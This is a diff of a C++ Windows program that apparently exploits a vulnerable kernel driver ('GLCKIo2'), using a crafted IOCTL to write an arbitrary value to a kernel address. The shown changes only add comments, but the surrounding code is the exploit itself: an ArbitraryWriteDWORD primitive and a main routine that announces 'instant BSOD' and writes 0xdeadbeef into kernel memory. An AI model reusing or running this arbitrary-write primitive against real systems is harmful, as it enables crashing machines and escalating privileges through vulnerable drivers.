@@ -9,7 +9,7 @@
 #include <winternl.h>
 
 // Define IOCTL code
-#define IOCTL_GLCKIO_VMWRITE 0x80102050
+#define IOCTL_GLCKIO_VMWRITE 0x80102050 //need to rename left over from testing
 
 // Device name
 #define DEVICE_NAME "\\\\.\\GLCKIo2"
@@ -33,7 +33,7 @@ BOOL ArbitraryWriteDWORD(ULONG64 dest, DWORD value)
     STRUCT_GLCKIO_VMWRITE mystructIn = { 0 };
     mystructIn.magic_number = 0x0E; // New magic number
     mystructIn.value = value;        // Value to write
-    mystructIn.ioctl_code = IOCTL_GLCKIO_VMWRITE; // Set IOCTL code
+    mystructIn.ioctl_code = IOCTL_GLCKIO_VMWRITE; // Set IOCTL code //rename
     mystructIn.dest_address = dest;  // Destination address
 
     STRUCT_GLCKIO_VMWRITE mystructOut = { 0 };
@@ -53,13 +53,13 @@ BOOL ArbitraryWriteDWORD(ULONG64 dest, DWORD value)
 
     if (!result) {
         DWORD error = GetLastError();
-        std::cerr << "[ERROR] IOCTL 0x" << std::hex << IOCTL_GLCKIO_VMWRITE
+        std::cerr << "[ERROR] IOCTL 0x" << std::hex << IOCTL_GLCKIO_VMWRITE //rename
             << " failed with error " << std::dec << error
             << " | Input Size: " << sizeof(mystructIn) << std::endl;
         return FALSE;
     }
     else {
-        std::cout << "[SUCCESS] IOCTL 0x" << std::hex << IOCTL_GLCKIO_VMWRITE
+        std::cout << "[SUCCESS] IOCTL 0x" << std::hex << IOCTL_GLCKIO_VMWRITE //rename
             << " succeeded. Bytes returned: " << returned
             << " | Input Size: " << sizeof(mystructIn) << std::endl;
         return TRUE;
@@ -95,7 +95,7 @@ int main()
     std::cout << "Press ENTER for instant BSOD" << std::endl;
     getchar();
 
-    ArbitraryWriteDWORD(0xfffff802deadbeef, 0xdeadbeef);
+    ArbitraryWriteDWORD(0xfffff802deadbeef, 0xdeadbeef); //need to update left over from testing
 
     CloseHandle(ghDriver);
     return 0;
